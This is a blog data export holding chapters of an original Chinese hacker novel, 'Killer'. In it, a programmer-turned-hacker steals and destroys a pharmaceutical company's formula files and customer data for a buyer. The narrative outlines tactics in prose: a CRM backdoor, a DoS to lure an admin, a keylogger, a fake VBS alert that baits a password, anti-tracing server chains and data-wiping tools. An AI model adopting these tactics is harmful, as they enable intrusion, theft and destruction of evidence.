-ano，可以查看端口连接情况，同时也会显示进程的pid值。在打开任务管理器（ctrl＋alt＋del）。其中在查看选项中选中pid。这里的pid跟刚才命令行中的pid值对应就可以看出是哪个进程连接了哪里的网络。当然在命令行下也可以使用tasklist查看进行和pid等信息。对于网络连接的查看有一款图形化的工具tcpview可以直接查看。&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;Killer-Chapter-Three&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;Jack来到了天成网络公司的总部，他身穿一身白色衬衫，一条浅蓝色牛仔裤，整个人看上去非常的精神。到达后公司的人热情招待，但是Jack则直接拒绝了，要求立刻就要开始进行分析追踪。因为这对他来说，是一次有趣的挑战。他有些迫不及待是一个什么样的人干了这件事情。&lt;/p&gt;\n&lt;p&gt;首先询问了系统部人员的一些网络架构。以及现在企业内部所做的全防护措施。接着他有询问了更加具体的信息，其中包含了文件保存的位置，以及发生的时间点等。通过快速的对话沟通，Jack了解了对方的网络一个大概的安全状况。&lt;/p&gt;\n&lt;p&gt;他跟对方的技术负责人说道：“你们现在的网络情况相对来说做的非常不错，你们目前忽略了公司员工的安全意识，以及目前网络并没有对外流出数据进行一个很好的监控。这使的黑客有机可乘。”&lt;/p&gt;\n&lt;p&gt;“哎呦，您真的是太专业的，我们已经把我们所了解到的都利用上了，同时我们也经常找安全团队来对我们的系统进行入侵测试。然而他们并没有发现什么内容。发现的我们也都已经修复了。”系统部负责人拍了下大腿，高兴的对Jack说道。因为他似乎看到了希望，看到了眼前这个人可以查出入侵者，这样他也就不会被炒鱿鱼了。&lt;/p&gt;\n&lt;p&gt;“如果真的如你说的这般，这次的攻击者也是花了很大的代价来入侵你们，看来对方是真的下了血本，想置你们公司于死地啊。”放心，这次我一定要帮助你们找到真凶。他更加的想要知道究竟是什么样人了。&lt;/p&gt;\n&lt;p&gt;“能有您的加入，那真的是太好了，有什么需要帮助的，需要我们提供的，您就尽管说。我们一定全力配合您。”&lt;/p&gt;\n&lt;p&gt;“好，那我们废话不多说，开始吧。”&lt;/p&gt;\n&lt;p&gt;“好，小王，给Jack倒一杯咖啡。”&lt;/p&gt;\n&lt;p&gt;说着Jack找了个空位置，很不客气的就坐下了，从他的背包中拿出了自己的thinkpad笔记本。上面有一个blackhat的贴纸，看上去非常的酷。&lt;/p&gt;\n&#34;,&#34;title&#34;:&#34;原创小说《杀手》第三章 追踪&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;小说&#34;,&#34;slug&#34;:&#34;CxFvcMcMqY5&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/CxFvcMcMqY5/&#34;},{&#34;name&#34;:&#34;novel&#34;,&#34;slug&#34;:&#34;JJyH5v-0vnk&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/JJyH5v-0vnk/&#34;},{&#34;name&#34;:&#34;日志审计&#34;,&#34;slug&#34;:&#34;W2TSgN-9JX2&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/W2TSgN-9JX2/&#34;},{&#34;name&#34;:&#34;反溯源&#34;,&#34;slug&#34;:&#34;i7JCTXsU9aX&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/i7JCTXsU9aX/&#34;}],&#34;date&#34;:&#34;2020-03-13 14:39:50&#34;,&#34;dateFormat&#34;:&#34;2020-03-13&#34;,&#34;feature&#34;:&#34;https://bacde.me/post-images/Killer-Chapter-Three.jpg&#34;,&#34;link&#34;:&#34;https://bacde.me/post/Killer-Chapter-Three/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;14 min read&#34;,&#34;time&#34;:838000,&#34;words&#34;:4104,&#34;minutes&#34;:14},&#34;description&#34;:&#34;Jack来到了天成网络公司的总部，他身穿一身白色衬衫，一条浅蓝色牛仔裤，整个人看上去非常的精神。到达后公司的人热情招待，但是Jack则直接拒绝了，要求立刻就要开始进行分析追踪。因为这对他来说，是一次有趣的挑战。他有些迫不及待是一个什么样的人...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%9C%AF%E8%AF%AD%E8%A7%A3%E9%87%8A\&#34;&gt;术语解释&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%B0%8F%E7%9F%A5%E8%AF%86\&#34;&gt;小知识&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;p&gt;&lt;strong&gt;生命的短暂犹如露珠消散，人们在奔波中探寻答案。命运如同大海起伏不定，键盘在黑夜中吟唱悲歌。&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;寂静的黑夜，人们的呼声飘荡在夜空中。&lt;/p&gt;\n&lt;p&gt;北京市朝阳区酒仙桥路阳光上东小区，在某间屋子里，一个人人正在神情专注的盯着电脑，不断的发出鼠标点击和敲击键盘的噼啪声，那声音清脆极了，犹如美妙的音符一般。&lt;/p&gt;\n&lt;p&gt;王梓正在探寻对方的公司内部网络，寻找着重要信息。看似平静的夜晚，而危险正在通过网络悄无声息的靠近。在未来的一个月内不知道会有多少人面临着失业，抑或者有人因此而自杀，也不知道多少病人因为药厂不能提供一些药物而加重病情，甚至死去。人们无法预测自己的未来和控制未来。杀手掌握着别人的未来，可是对于杀手抑或者网络杀手来说，他们自己的未来，也同样掌握在别人的手里。&lt;/p&gt;\n&lt;p&gt;人们还不知道危险就在自己的身边，人的生命有时候就是这样的脆弱。人们的命运都掌握在别人手里，在这大千世界面前我们都是弱者。即使强者也只是暂时的，不断变换着的。&lt;/p&gt;\n&lt;p&gt;王梓通过之前的几台员工电脑，很顺利的便控制了对方的crm（客户关系管理系统）、文件备份管理系统。此时的他正在准备获取到公司内部网络的最高管理权限（域控制权限）。黑色窗口，白色字符，不断闪现的流动的一串串字符。每一次的键盘敲击，都是在与目标靠近。&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;p&gt;王梓通过获取到的用户名列表，确认了管理员的账户名。接下来，他制造了一个陷阱，在已经控制的crm系统中留下了后门。该后门在网络管理员登陆对方到crm的系统远程连接时，会向网络管理者的电脑中植入远程控制程序，同时还会记录管理员登陆账户名和密码（类似gina木马功能）。做完这个操作后，王梓的脸上露出了微笑。一张清秀的脸，没有戴眼镜的他竟然有些帅气。&lt;/p&gt;\n&lt;p&gt;第二天早上，王梓公司内&lt;/p&gt;\n&lt;p&gt;如往常般，小楠亲切地跟王梓打招呼，王梓傻傻的笑笑。然后略带羞涩的对小楠说：“那个，那个什么，我给你买了早餐，放在你的桌子上了。”&lt;/p&gt;\n&lt;p&gt;小楠很是意外，这个平时话不多，不怎么与别人交流的人，竟然给她买了早餐。&lt;/p&gt;\n&lt;p&gt;“说你是不是有什么事请我帮忙？”&lt;/p&gt;\n&lt;p&gt;“没，没有”，王梓有点结巴的答道&lt;/p&gt;\n&lt;p&gt;“真的没有？”这次，小楠特意加重了语气。&lt;/p&gt;\n&lt;p&gt;“没有～”，王梓则挠挠自己的后脑勺回答。&lt;/p&gt;\n&lt;p&gt;“那你怎么突然给我买早餐了？莫非是你也要追我？”&lt;/p&gt;\n&lt;p&gt;“我我……我是看你每天都不吃早餐，怕你胃不好，就就，就给你买了”。听到小楠那么问他，王梓即使没有追她的想法，也立刻脸红了起来。&lt;/p&gt;\n&lt;p&gt;“哦，那谢谢”。&lt;/p&gt;\n&lt;p&gt;小楠回到座位上，看到了一份肯德基早餐。有粥，有煎蛋，还有一根油条。小楠心里是暖暖的，表面上硬装做正常样，然后动手吃起来。&lt;/p&gt;\n&lt;p&gt;王梓看到小楠开始吃起来了，他则偷偷的拿着自己的macbook笔记本，跑到厕所里，先是左看看，右看看，确认无人后，找了间进去，坐在马桶上。打开电脑，连入自己家里的电脑。利用之前控制的天成制药的几台系统，偷偷的用他们的电脑访问了crm系统存在的一处DoS问题，来让对方的crm系统异常，这样系统管理员就会登陆系统去处理。此时的王梓，还经常听外面是否有人。幸好，在这个过程中都没有人进来。&lt;/p&gt;\n&lt;p&gt;而此时，在天成制药企业办公楼内，一名市场人员，首先发现发现crm系统打不开了。他拨通了系统部电话&lt;/p&gt;\n&lt;p&gt;“系统部么，我们这边的crm系统登陆不进去了，你们赶紧看看吧。”&lt;/p&gt;\n&lt;p&gt;“进不去？是什么样子的？”&lt;/p&gt;\n&lt;p&gt;“一直在加载状态，系统显示一片空白。”&lt;/p&gt;\n&lt;p&gt;“好，马上处理。”&lt;/p&gt;\n&lt;p&gt;天成制药的系统部小王接到了这个处理任务，由于他刚来不久，所以要好好表现，一听到有紧急事情处理，迅速的就进行处理。&lt;/p&gt;\n&lt;p&gt;结果很顺利，对方的管理员在5分钟内就连入了系统。并重启了crm系统（不久后，该管理员联系了软件开发商，并修复了这个DoS问题）。而王梓也很顺利的控制了这名网络管理员的电脑和密码。王梓合上电脑，回到座位上。正常工作起来。&lt;/p&gt;\n&lt;p&gt;王梓监控了管理员的电脑，并且在该名管理员电脑中找到了服务器，以及网络架构设计文档，以及对电脑资产的详细说明。这一切都在王梓的计划掌控之内，非常的顺利。王梓已经获取到了整个公司的管理权限（域控）。现在他就像拿到了最高级别的身份验证卡，可以任意的进入任何区域不受限制。&lt;/p&gt;\n&lt;p&gt;王梓通过oa系统中的组织架构，盯上了几位公司的高层电脑，以及公司管理机密信息的人。他进入这些系统，翻看这些系统中的文件，寻找着他想要的文件。终于，王梓在该公司的董事长电脑中发现了一份加密的文档，这个文档就是对方想要的。王梓看了下，加密算法比较复杂。接下来，他在这台电脑中植入了键盘记录的程序。但是接下来，如何让对方输入密码呢？王梓坐在电脑前，闭着眼睛，双手合十，两只拇指架在下巴上，两只食指拄在眉宇之间。他陷入了思考中。&lt;/p&gt;\n&lt;p&gt;突然，他睁开双眼，双手在键盘上输入敲了几十下，接下来，他在对方的电脑设定了一个定时任务，并且把刚刚制作好的文件传到了对方电脑上。&lt;/p&gt;\n&lt;p&gt;制作的文件是一个vbs后缀的文件，里面的内容是王梓编写的一行代码&lt;/p&gt;\n&lt;p&gt;代码如下：&lt;/p&gt;\n&lt;p&gt;msgbox(&amp;quot;您系统中的文件xxxx配方.rar可能存在问题，请注意检查！&amp;quot;)&lt;br&gt;\n接下来就是漫长的等待了。事情发展的似乎并没有那么顺利，天成制药的董事长在接下来的几天内都出差，所以，王梓并没有得到密码。不过离交货的日子还够，王梓也并不着急。而他现在开始每天给小楠买早餐吃，而小楠也没有说拒绝的话。&lt;/p&gt;\n&lt;p&gt;一周后，天成制药的董事长终于回来了，当他看到系统提示的时候，他发现这是一个很重要的文档，这使他担心起来，但是作为多年商场经验的他，还是让他保持冷静，他打开文档，并输入了很长一串的密码。发现没有任何问题后，他松了一口气。而在这操作的后面，他的一长串密码，都已经被记录下来。&lt;/p&gt;\n&lt;p&gt;而另外一边的王梓，看到密码后，打了一个响指，并喊了一声耶。他迅速的把文件传回，确认可以打开后，他把源文件在对方电脑中，使用wywz（中文名无影无踪，一款擦除数据的工具）进行了删除。&lt;/p&gt;\n&lt;p&gt;王梓将他的文件发送给了客户，并且收取了尾款。他便把所有关于买家的记录和信息删除掉。他从来不愿意跟买家进行多余的对话，包括一些客套话。接下来，他觉得他可以休息一段时间了。&lt;/p&gt;\n&lt;p&gt;一个正常的周二夜晚，王梓跟往常下班一样站在公交站等车。此时的北京正是秋天，夏天带着闷热已经离去，而秋天带着风向人们袭来一丝丝凉意。公交车到了，王梓上车后找了一个靠窗的座位坐下。前面是一对情侣，女孩搂着男孩的脖子倚偎在男孩的怀里睡觉，男孩用他的手一下一下拍着女孩。不时的还会转过头看看怀里的女孩，然后满足的笑笑。这温暖的画面，赶走了这秋天的风带来的凉意。&lt;/p&gt;\n&lt;p&gt;王梓看向窗外看去，人群中有一个穿着卫衣、牛仔裤，休闲鞋的小伙子正低头一脸认真的盯着手机，这个人是小白，此时他手机上显示的是一篇记大牛写的反追踪黑客的技术文章。小白最近也还在研究那几个异常ip。王梓下班坐车会经常看到小白。只是两个人都不认识。而很快的小白就消失在王梓的视线里，一对手拉着手的情侣正在有说有笑的走着，随着车的行驶更多下班回家的人人进入王梓的视线，说是家，其实大多数不过是临时跟别人一起租来的一个房子，自己拥有一件小小的空间里而已。在这座城市大家都在努力奋斗，为了有一天可以改变自己的命运。&lt;/p&gt;\n&lt;p&gt;就在同一时刻的深圳天成制药总部，市场部、研发部、系统部以及公司的高层都在公司里加班。系统部里不断有其他部门的同事、高层等打来电话来询问。&lt;/p&gt;\n&lt;p&gt;“你们赶快想办法给我恢复文件，这文件非常重要，你要是不行，趁早给我滚蛋回家。”天成制药公司董事长疾言厉色地责骂系统部的人。&lt;/p&gt;\n&lt;p&gt;“是是是，我们正在尝试恢复以及追查攻击者。”接电话的人吓得连忙应到。&lt;/p&gt;\n&lt;p&gt;“速度！速度！速度！听明白没有。”董事长很清楚，攻击者可以销毁这些文件，同样也可以把文件给竞争对手，如果部快速找到凶手，那么损失损失将是巨大的。&lt;/p&gt;\n&lt;p&gt;“明白！明白！您放心！”&lt;/p&gt;\n&lt;p&gt;“有进展第一时间向我汇报。”&lt;/p&gt;\n&lt;p&gt;“好！一定！”&lt;/p&gt;\n&lt;p&gt;公司的高层也在会议室里讨论着解决办法，解决方案。此时整座公司大楼里是一幅鸡飞狗跳的场景。对于天成制药的绝大多数人来说，注定是一个不眠的夜晚。尽管如此，在第二天，网络上就开始有消息传天成制药公司被黑客入侵，泄漏了客户信息，以及制药的配方文件被销毁。消息一发出，迅速的传遍了整个制药行业，同时也传到了天成制药的投资方合作伙伴，客户那里。他们纷纷打电话到天成制药质问，有些脾气不好的则在咒骂。其实这算好的，更加致命的是天成制药的股票开始迅速下迭，投资方要求撤资。这无疑是在伤口上撒了一把盐，巨痛无比，就算熬过了这个阶段，也可能慢慢的死去。&lt;/p&gt;\n&lt;p&gt;天成制药公司高层召开紧急会议。&lt;/p&gt;\n&lt;p&gt;董事长一脸愤怒的表情，接着对大家说道：&lt;/p&gt;\n&lt;p&gt;”现在公司的状况，大家也都清楚了，我无需多言。公关部快速，不！是立刻，马上给我出一个对外的说明。“&lt;/p&gt;\n&lt;p&gt;”还有销售部，市场部，安抚各自负责的区域、客户。“&lt;/p&gt;\n&lt;p&gt;”系统部，文件是否能够恢复？攻击者查的如何了？“&lt;/p&gt;\n&lt;p&gt;”目前还没有进展。“系统部负责人低着头，并且说话声音很小。&lt;/p&gt;\n&lt;p&gt;”我要你们有什么用？你们是干什么吃的？花了那么多的钱，防防不住，查也没查到任何东西，恢复也恢复不了。你们跟猪有什么区别，啊”&lt;/p&gt;\n&lt;p&gt;系统部负责人沉默。&lt;/p&gt;\n&lt;p&gt;“你们倒是说话啊，平时看你们就没啥成绩，关键时刻啥啥都不行。你们如果自己不行，那就找可以的人啊，重金去找～”&lt;/p&gt;\n&lt;p&gt;”董事长，我们为什么不报案？“&lt;/p&gt;\n&lt;p&gt;“你是猪脑子啊，我们一报案，外面的传闻不就证实是真的了么？等你查到攻击者在说。”&lt;/p&gt;\n&lt;p&gt;“好，我这就去。”&lt;/p&gt;\n&lt;p&gt;天成制药很多人都在忙碌着，大家都在一起面对这一场突如其来的危机，同时也在做着各种心理准备，因为他们还不知道是谁在暗地里搞他们，而且还是往死里整。&lt;/p&gt;\n&lt;p&gt;天成制药公关部对外宣称，请勿相信外界传闻，天成制药正在研发新产品，公司现在一切正常。同时，系统部的人开始在私底下利用关系网寻找安全圈子里的牛人。&lt;/p&gt;\n&lt;p&gt;公关部对外已经得到一些平息，系统部这边也在网络上花了重金找到一名安全界的大牛——Jack，Jack是一家安全平台灰云的为一名安全研究员。同时也是insight labs组织的成员之一。有多起公司被入侵事件，都是由Jack追查到，并且通过黑客技术反黑入攻击者的计算机系统中。帮助警察成功抓住了攻击者。最厉害的一次要属新浪微博的入侵事件了。&lt;/p&gt;\n&lt;p&gt;这次他接受了天成制药的邀请，追查黑客。&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;（未完待续）&lt;/strong&gt;&lt;/p&gt;\n&lt;h2 id=\&#34;借鉴\&#34;&gt;借鉴：&lt;/h2&gt;\n&lt;p&gt;生命短暂犹若露珠消散，人们在奔波中探寻答案。&lt;/p&gt;\n&lt;p&gt;运数仿佛大海起伏不定，掌上迷离脉纹回路漫漫。&lt;/p&gt;\n&lt;p&gt;长剑在黑夜吟唱悲歌，岁月如斑驳铜镜经年。&lt;/p&gt;\n&lt;p&gt;天际流火叩响大地之门，岁月星辰刻画沧桑年轮。&lt;/p&gt;\n&lt;p&gt;纵横交错兮天下之局，谁能参悟兮世事如棋。&lt;/p&gt;\n&lt;h2 id=\&#34;黑客兵器谱\&#34;&gt;黑客兵器谱&lt;/h2&gt;\n&lt;p&gt;wywz：中文名无影无踪，一款擦除电脑硬盘数据的工具，使用该工具删除的文件，擦除入侵痕迹，将很难被恢复。&lt;/p&gt;\n&lt;h2 id=\&#34;注解\&#34;&gt;注解：&lt;/h2&gt;\n&lt;ol&gt;\n&lt;li&gt;\n&lt;p&gt;注解1：后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序方法。&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;注解2：“特洛伊木马”（trojan wooden-horse），简称“木马”。特洛伊木马目前一般可理解为“为进行非法目的的计算机病毒”，在电脑中潜伏，以达到黑客目的。原指一希腊传说。在古希腊传说中，希腊联军围困特洛伊久攻不下，于是假装撤退，留下一具巨大的中空木马，特洛伊守军不知是计，把木马运进城中作为战利品。夜深人静之际，木马腹中躲藏的希腊士兵打开城门，特洛伊沦陷。&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;注解3:DoS是Denial of Service的简称，即拒绝服务，造成DoS的攻击行为被称为DoS攻击，其目的是使计算机或网络无法提供正常的服务。文章中提到的Dos，指的是一种Redos漏洞，可使你CPU占满，导致系统出现异常。具体内容可自行百度了解。&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&lt;p&gt;文中提到的现实人物：Jack(Piaca).&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;Killer-Chapter-Two&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;&lt;strong&gt;生命的短暂犹如露珠消散，人们在奔波中探寻答案。命运如同大海起伏不定，键盘在黑夜中吟唱悲歌。&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;寂静的黑夜，人们的呼声飘荡在夜空中。&lt;/p&gt;\n&lt;p&gt;北京市朝阳区酒仙桥路阳光上东小区，在某间屋子里，一个人人正在神情专注的盯着电脑，不断的发出鼠标点击和敲击键盘的噼啪声，那声音清脆极了，犹如美妙的音符一般。&lt;/p&gt;\n&lt;p&gt;王梓正在探寻对方的公司内部网络，寻找着重要信息。看似平静的夜晚，而危险正在通过网络悄无声息的靠近。在未来的一个月内不知道会有多少人面临着失业，抑或者有人因此而自杀，也不知道多少病人因为药厂不能提供一些药物而加重病情，甚至死去。人们无法预测自己的未来和控制未来。杀手掌握着别人的未来，可是对于杀手抑或者网络杀手来说，他们自己的未来，也同样掌握在别人的手里。&lt;/p&gt;\n&lt;p&gt;人们还不知道危险就在自己的身边，人的生命有时候就是这样的脆弱。人们的命运都掌握在别人手里，在这大千世界面前我们都是弱者。即使强者也只是暂时的，不断变换着的。&lt;/p&gt;\n&lt;p&gt;王梓通过之前的几台员工电脑，很顺利的便控制了对方的crm（客户关系管理系统）、文件备份管理系统。此时的他正在准备获取到公司内部网络的最高管理权限（域控制权限）。黑色窗口，白色字符，不断闪现的流动的一串串字符。每一次的键盘敲击，都是在与目标靠近。&lt;/p&gt;\n&#34;,&#34;title&#34;:&#34;原创小说《杀手》第二章 黑夜来临&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;小说&#34;,&#34;slug&#34;:&#34;CxFvcMcMqY5&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/CxFvcMcMqY5/&#34;},{&#34;name&#34;:&#34;novel&#34;,&#34;slug&#34;:&#34;JJyH5v-0vnk&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/JJyH5v-0vnk/&#34;},{&#34;name&#34;:&#34;反溯源&#34;,&#34;slug&#34;:&#34;i7JCTXsU9aX&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/i7JCTXsU9aX/&#34;},{&#34;name&#34;:&#34;wywz&#34;,&#34;slug&#34;:&#34;NmDcRO-qpAm&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/NmDcRO-qpAm/&#34;},{&#34;name&#34;:&#34;Novel&#34;,&#34;slug&#34;:&#34;zyteNdG7g7N&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/zyteNdG7g7N/&#34;}],&#34;date&#34;:&#34;2020-03-12 10:00:46&#34;,&#34;dateFormat&#34;:&#34;2020-03-12&#34;,&#34;feature&#34;:&#34;https://bacde.me/post-images/Killer-Chapter-Two.jpg&#34;,&#34;link&#34;:&#34;https://bacde.me/post/Killer-Chapter-Two/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;14 min read&#34;,&#34;time&#34;:801000,&#34;words&#34;:3973,&#34;minutes&#34;:14},&#34;description&#34;:&#34;生命的短暂犹如露珠消散，人们在奔波中探寻答案。命运如同大海起伏不定，键盘在黑夜中吟唱悲歌。\n寂静的黑夜，人们的呼声飘荡在夜空中。\n北京市朝阳区酒仙桥路阳光上东小区，在某间屋子里，一个人人正在神情专注的盯着电脑，不断的发出鼠标点击和敲击键盘的...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%80%9F%E9%89%B4\&#34;&gt;借鉴：&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E9%BB%91%E5%AE%A2%E5%85%B5%E5%99%A8%E8%B0%B1\&#34;&gt;黑客兵器谱&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%B3%A8%E8%A7%A3\&#34;&gt;注解：&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;p&gt;杀手是在生活中受到雇主的雇佣，而去执行杀人任务，最终获得报酬。他们孤独，不轻易相信其他任何的人。他们非常冷酷，面对生命，他们从来不会手下留情。因为杀人就是她们的存在的意义。很少有人见过他们，因为大多数见过他们的人，都已经被杀死掉了。他们平时白天不出门，只有在夜里才开始行动，他们出去都会戴上墨镜，头顶一顶鸭舌帽，有时候以雾霾为由戴上口罩。其实，他们只是不想别人知道他们的真正面目。他们活在黑暗的世界里，不见天日。他们很可怜，没有爱情，没有亲情，甚至连个朋友都没有。&lt;/p&gt;\n&lt;p&gt;在网络的世界中也有这样的一种人，他们不杀人，他们也不需要在现实中隐藏包装自己，因为他们只存在于虚拟的网络世界中，很少有人知道他们的真面目。他们同样在夜间才进行活动，他们的任务是窃取企业，政府的最高机密信息。更准确的说，可以叫他们为网络间谍。他们是这个网络上的杀手，他们不会亲自杀人，却因为他们盗取的信息，有他们的买家来去做一些伤天害理的事情，使很多人因此而家破人亡。不过，对于这个世界来说，每个人都有着他自己的命运，弱者注定要被这个社会淘汰，而这个也正是杀手们所认同的，在杀手已活着网络杀手看来，他们可以杀死（入侵的目标）的人都是弱者。他们信奉他们自己可以改变或控制别人的命运，甚至大多数人的命运。&lt;/p&gt;\n&lt;h2 id=\&#34;登场\&#34;&gt;登场&lt;/h2&gt;\n&lt;p&gt;“早～”，小楠对刚刚到公司的王梓打招呼。王梓则开心的笑笑，作为回应。&lt;/p&gt;\n&lt;p&gt;王梓是一家中日合资的中型软件公司的程序员。性格内向，腼腆。长相一般，在嘴巴的右上角有一颗痦子。在这家拥有数十位的程序员的公司，每个人都只负责各自的一部分，王梓在这里是其中普普通通的一员，公司部门内部竞争激烈，升职也比较困难，王梓不时还会犯些小错误，因为被领导破口大骂。对此王梓什么都不说，只在一旁听着，完事后继续回到座位上默默的工作。这时候，作为翻译的小楠总会过来安慰王梓。王梓也总说是他自己的错误。不怪领导发脾气。&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;p&gt;“他怎么不对别人发脾气？他就是看你老实，他心情不好，拿你出气你还看不出来么。”小楠愤愤不平道。因为她看不惯领导这样的行为，不过她也只能说说，对此她也没有任何的办法。&lt;/p&gt;\n&lt;p&gt;“领导也是为我好～”，说完傻笑。&lt;/p&gt;\n&lt;p&gt;“你呀你，真是拿你没办法，你也别太老实了，我看呀，你以后也别叫王子了，叫你傻子好了”&lt;/p&gt;\n&lt;p&gt;王梓的脸上依旧傻笑着，也没在说什么，也没有反驳。&lt;/p&gt;\n&lt;p&gt;小楠是公司里的一位大美女，有一双清澈明亮的眼睛，弯弯的柳眉，长长的睫毛微微地颤动着，白皙无瑕的皮肤透出淡淡红粉。你在看她说话的的时候，你很容易不自觉的沉醉于她的眼神里。直到你脸上火辣的痛让你瞬间清醒过来。小楠用她那芊芊玉手打在王梓的脸上。当王梓要解释的时候，小楠已经转身离开。&lt;/p&gt;\n&lt;p&gt;对于小楠这样公司里的大美女，身边当然不乏许许多多的追求者，但是，都被小楠拒绝了。但依然有人不放弃，每天都会送花给小楠，而小楠统统将他们喂给刚刚清理过的垃圾桶里。如果王梓有时看到了，就会对小楠说：”这些花这么漂亮丢掉了多可惜啊。“而小楠则总是回他道：”你喜欢你拿去喽，反正我不要，你也别问我为什么“。王梓也不敢在继续问下去，就会到自己的座位，去敲他的代码。&lt;/p&gt;\n&lt;p&gt;夜幕降临，马路上排满了长长的车队，每隔一会就会传来鸣笛的声音。使得这个夜更加的喧闹。王梓打开房门，开了灯，眼前是一间50多平米的屋子，在客厅中摆放了3台电脑，4个显示器。显示器上显示着一个世界地图，地图上显示了很多闪烁的圆点，点会有一条线与另外一个同样的点连接，这些点会不断的变换。这个是实时显示的是王梓部署的一些监控点，显示了哪些地方的电脑（服务器）正在发生着攻击，或者已经被攻击了。这是王梓的一个僵尸网络，也就是在他的肉机上作了监控，他监控这些信息为了对时间发现哪些已经被多人控制，是否有人对他进行反查。一旦发现这些，王梓会第一时间收到报警，收到报警后他可以选择是否启动证据销毁和自毁这一操作。&lt;/p&gt;\n&lt;p&gt;王梓在白天的时候他是一名程序员，但是到了晚上，他的身份则是一名网络黑客。而他的另一个职业就是网络杀手，他的代号是——47，杀手47。他的网络id是killer47.知道他这一身份的是一名他从小长大的警察朋友——石磊。由于他俩关系非常要好，石磊并没有抓王梓。可以说石磊石王梓最信任的朋友，也是一个唯一信任的朋友。&lt;/p&gt;\n&lt;p&gt;王梓煮了一份泡面，煮好后，做到他的核武器面前，这几台电脑是自己定制化的设备。专门用来他工作用，这里面，由他自己设计并制作的，人员信息检索系统，可以查到大部分国内人员的基础信息，以及一些相关记录，如开房记录，外卖，行程，购物，体检，以及还有个人履历。还有他这套远程监控程序，其中除了监控之外，还可以进行远程操控的功能。都是王梓自己一个人制作的。除了这些之外，还有一套定制化的攻击系统。系统中不仅包含公开的黑客工具，如nmap，metasploit，sqlmap等，还包含了一些0day程序。整套系统乃至所有的硬盘数据都是经过加密，从硬件的硬盘密码加密，在到软件的系统数据加密。密码都设置的非常复杂，并深深的印在王梓的大脑里。就算有人拿到电脑或者硬盘没有密码也无济于事。而且这些系统可以接收手机的控制指令，远程销毁数据。&lt;/p&gt;\n&lt;p&gt;对于网络的通信，这套系统与王梓部署在国外5台小的个人的idc机房中的服务器，这些服务器是匿名的，不再政府那里登记的，这些也同样进行了加密和销毁程序。5台服务器中3台在使用中，另外2台是处于备用状态。5台服务器分别分布在香港，日本，美国，韩国，英国。&lt;/p&gt;\n&lt;p&gt;王梓的电脑系统在去行动之前会利用加密的协议接入这些系统中，系统中都会连接如tor的匿名网络中，利用这些匿名网络连接如肉鸡（被黑客控制的电脑叫肉鸡）或者跳板（通过肉鸡去进行入侵）。该连接会经过3层，也就是先连接到香港服务器，再通过该服务器连接的tor网络连接日本服务器。日本服务器会以同样的方式连接到韩国服务器。优先使用该服务器是因为这几台服务器连接速度快。&lt;/p&gt;\n&lt;p&gt;这一整套的系统，花了王梓5年时间，王梓对这套系统很自豪，很满意。&lt;/p&gt;\n&lt;h2 id=\&#34;行动\&#34;&gt;行动&lt;/h2&gt;\n&lt;p&gt;做为一名杀手要隐藏自己的气息，让敌人从来不会感觉到他们的存在。当敌人放松警惕时，杀手们会抓住最佳时机，一击毙命。他们是潜藏在黑夜中的普通人。&lt;/p&gt;\n&lt;p&gt;王梓打开了他的收件箱，是一封pgp加密邮件，解密的邮件内容只有一个单词“help”。王梓懂的这是什么意思，他在自己的聊天服务器上开通了一个账号，发送给了对方，并一起发送了一个聊天软件的下载地址。该聊天系统是也是架设在网络上的服务器，聊天内容通过端到端的加密，服务器上也不会保存任何的聊天记录。（备注：其irc纯文本聊天服务和客户端，另外还有可选择的是xmpp协议的聊天软件）。&lt;/p&gt;\n&lt;p&gt;“Mr.Killer47,我要获取天成制药的客户资料，同时销毁他们的客户名单，删除制药配方”&lt;/p&gt;\n&lt;p&gt;“价格！”&lt;/p&gt;\n&lt;p&gt;“二十万”&lt;/p&gt;\n&lt;p&gt;“太少了，五十万”&lt;/p&gt;\n&lt;p&gt;“你这胃口太大了”&lt;/p&gt;\n